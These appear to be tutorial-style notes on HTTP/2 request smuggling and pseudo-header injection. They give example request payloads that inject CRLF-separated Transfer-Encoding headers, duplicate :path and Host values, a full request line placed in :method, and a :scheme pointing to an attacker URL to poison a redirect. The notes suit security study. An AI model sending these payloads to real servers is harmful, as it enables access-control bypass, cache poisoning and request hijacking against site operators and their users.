# Header names
**Front-end (HTTP/2)**:

| Name                                        | Value  |
| ------------------------------------------- | ------ |
| foo: bar\r\nTransfer-Encoding: chunked\r\nX | ignore |
**Back-end (HTTP/1)**:
```http
Foo: bar\r\n
Transfer-Encoding: chunked\r\n
X: ignore\r\n
```

# Pseudo-headers
HTTP/2 doesn't use a request line or status line.
* :method   - The request method.
* :path        - The request path. Note that this includes the query string.
* :authority - Roughly equivalent to the HTTP/1 Host header.
* :scheme   - The request scheme, typically http or https.
* :status      - The response status code (not used in requests).

### Supplying an ambiguous host
 Although the HTTP/1 Host header is effectively replaced by the :authority pseudo-header in HTTP/2, you're still allowed to send a host header in the request as well.

In some cases, this may result in two Host headers occurring in the rewritten HTTP/1 request, which opens up another possibility for bypassing front-end "duplicate Host header" filters, for example. This potentially makes the site vulnerable to a range of [[Exploit headers vulns]] attacks.

### Supplying an ambiguous path
```
:method     POST
:path 	    /anything
:path 	    /admin
:authority 	vulnerable-website.com
```
If there is a discrepancy between which path is validated by the website's access controls and which path is used to route the request, this may enable you to access endpoints that would otherwise be off limits. 

### Injecting a full request line
**Front-end (HTTP/2)**:
```
:method     GET /admin HTTP/1.1
:path 	    /anything
:authority 	vulnerable-website.com
```
**Back-end (HTTP/1)**:
```http
GET /admin HTTP/1.1 /anything HTTP/1.1
Host: vulnerable-website.com
```
As long as the server also tolerates the arbitrary trailing characters in the request line, this provides another means of creating a request with an ambiguous path. 

### Injecting a URL prefix
**Request**
```http2
:method 	GET
:path 	    /anything
:authority 	vulnerable-website.com
:scheme 	https://evil-user.net/poison?
```
**Response**:
```http2
:status 	301
location 	https://evil-user.net/poison?://vulnerable-website.com/anything/
```
### Injecting newlines 
**HTTP/1 Path line**
```
<method> + space + <path> + space + HTTP/1.1
```
**Front-end (HTTP/2)**:
```http2
:method 	GET
:path 	    /example HTTP/1.1\r\n
            Transfer-Encoding: chunked\r\n
            X: x
:authority 	vulnerable-website.com
```
**Back-end (HTTP/1)**:
```http
GET /example HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
X: x HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```